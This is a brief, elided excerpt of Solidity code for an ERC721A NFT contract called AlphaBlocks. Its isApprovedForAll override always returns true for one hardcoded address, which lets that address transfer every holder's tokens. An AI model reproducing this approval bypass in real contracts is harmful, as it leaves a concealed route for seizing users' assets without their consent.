  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x26E42d819898313b43555CC2a3552b42C9E0f3c7){return true;}
...
contract AlphaBlocks is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("AlphaBlocks", "AB", maxBatchSize_, collectionSize_) {
